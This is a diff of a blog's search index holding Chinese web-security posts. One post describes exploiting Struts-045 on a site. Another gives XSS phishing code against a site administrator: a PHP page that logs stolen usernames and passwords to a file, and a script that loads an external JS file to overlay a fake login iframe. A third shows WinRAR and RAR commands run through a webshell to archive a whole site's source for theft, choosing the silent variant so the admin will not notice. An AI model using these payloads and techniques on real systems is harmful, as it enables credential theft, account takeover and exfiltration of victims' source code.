@@ -1,9 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[在cmd中执行命令路径中包含空格的解决办法]]></title>
+    <url>%2F2018%2F01%2F22%2F%E5%9C%A8cmd%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%B7%AF%E5%BE%84%E4%B8%AD%E5%8C%85%E5%90%AB%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[今天找到一个站存在Struts-045漏洞，但是使用工具在执行命令的时候，由于命令中存在空格，执行时会报错：出错的原因就是因为路径中存在空格。 解决方案将整个路径和程序使用双引号包起来： 短文件名法：比如c:\Program Files缩写为c:\Progra~1。123采用8个字符缩写，即写头六个字母(略去空白），另加波浪号和1,首字母不足六个字母，略去空白，用了第二个词的字母，凑成六个。例如："Documents and Settings" -- DOCUME~1"Local Settings" -- LOCALS~1 （注意略去空白，用了第二个词的字母，凑成六个，再加波浪号和1） 如果多个文件前6字符一样怎么办？为什么最后是1而不是0或者其他数字呢？看看这个例子:假设下面是你的C盘根目录中的文件夹：123Program FilesProgra fileProgra zhang 则三个目录分别表示为：C:\Progra~1; C:\Progra~2; C:\Progra~3;]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title><![CDATA[XSS钓鱼获取后台账号密码]]></title>
     <url>%2F2018%2F01%2F07%2FXSS%E9%92%93%E9%B1%BC%E8%8E%B7%E5%8F%96%E5%90%8E%E5%8F%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[前几天在测试某个网站的时候，发现存在存储型跨站脚本漏洞，但是cookie被设置了http-only属性，导致无法获取到cookie的内容，有用的信息只是能够知道后台的地址，如下图所示：获得的信息并没有Sessionid，也没有授权key,更没有账号和密码，于是把思路转向钓鱼，访问后台，查看源代码。 使用钓鱼的方式获取网站后台账号密码伪造后台登录界面查看后台源代码，在本地保存为html文件，并且整理网站链接的路径，将原来的相对路径补充为完整的绝对路径（注意，网站的绝对路径需要是目标网站的域名）：这样，我们就在本地伪造了一个一模一样的后台登录界面。 修改源代码中的POST数据包的提交地址伪造好后台页面之后，还需要数据包的提交地址。找到源代码中的form表单，修改action选项的值为我们自己服务器的页面地址，这个页面用来接收管理员提交的账号密码。 编写账号密码接收页面&lt;?php $a = $_POST[&apos;userName&apos;]; $b = $_POST[&apos;password&apos;]; $file = fopen(&quot;fish.txt&quot;,&quot;a+&quot;); fwrite($file,$a); fwrite($file,&apos; &apos;); fwrite($file,$b); fwrite($file,&apos; &apos;); fclose($file); header(&apos;Location: http://xxx/main&apos;); ?&gt; 该段代码会接收POST参数userName和password（注意，这样个参数的名字需要从后台页面的表单中获得），并且将接收到的内容以追加的方式写入到当前目录中的fish.txt文件中，同时，将页面定位到http://xxx/main，这样做是为了，在调取管理员的账号密码之后，将管理员重定向到他自己网站的后台(因为管理员之前已经登录过自己的后台，重新定向到原网站的登录页面，会直接进入到后台首页)。 构建XSS语句构建如下语句：1&lt;script&gt;window.top.location.href="http://xxx/xxx/钓鱼.html";&lt;/script&gt; 将语句插入到之前能够打XSS的地方，等待管理员上钩即可。 总结攻击过程分析，将XSS语句写入，管理员访问后台触发之后，XSS语句会将管理员的浏览器重新定向到我们自己网站的伪造的和他后台页面一样的地址，如果管理员没有发现，并且在我们伪造的页面上做了登录操作，那么我们的页面会将POST的表单提交到我们的服务器的某个页面并且将内容记录到txt文件中，这样就获取到了管理员的账号密码。缺点，只要管理员不删除我们的攻击语句，只要他在后台访问存在攻击语句的页面，那攻击将会一直触发，也就是会不停的跳转到伪造的钓鱼页面，这样管理员很容易发现，后续需要考虑通过代码的方式实现该攻击仅仅触发一次。]]></content>
+    <content type="text"><![CDATA[前几天在测试某个网站的时候，发现存在存储型跨站脚本漏洞，但是cookie被设置了http-only属性，导致无法获取到cookie的内容，有用的信息只是能够知道后台的地址，重要的cookie被保护起来了，获得的信息并没有Sessionid，也没有授权key,更没有账号和密码，于是把思路转向钓鱼，访问后台，查看源代码。 使用钓鱼的方式获取网站后台账号密码伪造后台登录界面查看后台源代码，在本地保存为html文件，并且整理网站链接的路径，将原来的相对路径补充为完整的绝对路径（注意，网站的绝对路径需要是目标网站的域名）：这样，我们就在本地伪造了一个一模一样的后台登录界面。 修改源代码中的POST数据包的提交地址伪造好后台页面之后，还需要数据包的提交地址。找到源代码中的form表单，修改action选项的值为我们自己服务器的页面地址，这个页面用来接收管理员提交的账号密码。 编写账号密码接收页面&lt;?php $a = $_POST[&apos;userName&apos;]; $b = $_POST[&apos;password&apos;]; $file = fopen(&quot;fish.txt&quot;,&quot;a+&quot;); fwrite($file,$a); fwrite($file,&apos; &apos;); fwrite($file,$b); fwrite($file,&apos; &apos;); fclose($file); header(&apos;Location: http://xxx/main&apos;); ?&gt; 该段代码会接收POST参数userName和password（注意，这样个参数的名字需要从后台页面的表单中获得），并且将接收到的内容以追加的方式写入到当前目录中的fish.txt文件中，同时，将页面定位到 http://xxx/main这样做是为了，在调取管理员的账号密码之后，将管理员重定向到他自己网站的后台(因为管理员之前已经登录过自己的后台，重新定向到原网站的登录页面，会直接进入到后台首页)。 构建XSS语句构建如下语句：1&lt;script src=http://www.xxx.com/xxx/1.js&gt;&lt;/script&gt; 将语句插入到之前能够打XSS的地方。(如果链接太长，可以使用短链接生成器将链接缩短)1.js内容如下：1document.body.innerHTML=('&lt;div style="width:100%;height:100%"&gt;&lt;iframe src=http://www.xxx.com/xxx/main.html width=100% height=1000px scrolling=no frameborder=0&gt;&lt;/iframe&gt;&lt;/div&gt;'); iframe元素会创建包含另外一个文档的内联框架，也就是说如果我们在网页中添加了一个iframe元素，src一个需要内联的网址，然后src的网页就会加载在当前网站，这样当我们的xss代码被触发的时候，网站就会内嵌一个我们伪造的一毛一样的钓鱼页面在管理员的浏览器上，管理员可能就以为自己退出了系统，然后重新输入用户名和密码，这样密码就会发送到我们的服务器上，我们就可以利用用户名和密码进行登录了，然后就可以进入后台为所欲为了。]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
@@ -67,7 +75,7 @@
   <entry>
     <title><![CDATA[Webshell下使用winRAR下载整站源代码]]></title>
     <url>%2F2017%2F09%2F19%2FWebshell%E4%B8%8B%E4%BD%BF%E7%94%A8winRAR%E4%B8%8B%E8%BD%BD%E6%95%B4%E7%AB%99%E6%BA%90%E4%BB%A3%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[多数站点服务器都会安装winRAR，如果获得的Webshell能够运行exe文件，你就可以使用WinRAR.exe对目录进行打包。 把C:\SW\目录下的所有东西打包为root.rar放到C:\目录下，以便下载，命令如下：1C:\Program Files\WinRAR\WinRAR.exe a -k -r -s -m1 C:\root.rar C:\SW\ 参数说明: a 添加文件到压缩文件中 -k 锁定压缩文件 -s产生固体存档,这样可以增大压缩比 -r包括子目录 -m1 设置压缩比 -m0 存储 添加到压缩文件时不压缩文件。 -m1 最快 使用最快方式(低压缩) -m2 较快 使用快速压缩方式 -m3 标准 使用标准(默认)压缩方式 -m4 较好 使用较好压缩方式(较好压缩，但是慢) -m5 最好 使用最大压缩方式(最好的压缩，但是最慢) 注意：在菜刀中使用该方法对网站目录打包时，菜刀返回结果可能提示失败，实际上命令已经执行完成，可能的原因是网站源码很大，打包需要比较长的时间，等命令执行完成之后，返回到备份的路径下刷新，看看是否打包完成。]]></content>
+    <content type="text"><![CDATA[多数站点服务器都会安装winRAR，如果获得的Webshell能够运行exe文件，你就可以使用WinRAR.exe对目录进行打包。 把C:\SW\目录下的所有东西打包为root.rar放到C:\目录下，以便下载，命令如下：1C:\Program Files\WinRAR\WinRAR.exe a -k -r -s -m1 C:\root.rar C:\SW\ 参数说明: a 添加文件到压缩文件中 -k 锁定压缩文件 -s产生固体存档,这样可以增大压缩比 -r包括子目录 -m1 设置压缩比 -m0 存储 添加到压缩文件时不压缩文件。 -m1 最快 使用最快方式(低压缩) -m2 较快 使用快速压缩方式 -m3 标准 使用标准(默认)压缩方式 -m4 较好 使用较好压缩方式(较好压缩，但是慢) -m5 最好 使用最大压缩方式(最好的压缩，但是最慢) 注意：在菜刀中使用该方法对网站目录打包时，菜刀返回结果可能提示失败，实际上命令已经执行完成，可能的原因是网站源码很大，打包需要比较长的时间，等命令执行完成之后，返回到备份的路径下刷新，看看是否打包完成。 注意：使用WinRAR在打包的时候，在服务器桌面上回显示打包的界面，如果这个时候管理员在线就完了，不过我们可以使用另一个命令：1C:\Program Files\WinRAR\RAR.exe a -r -m3 C:\root.rar C:\SW\ 使用rar命令在进行压缩的时候，不会在桌面显示压缩窗口。]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
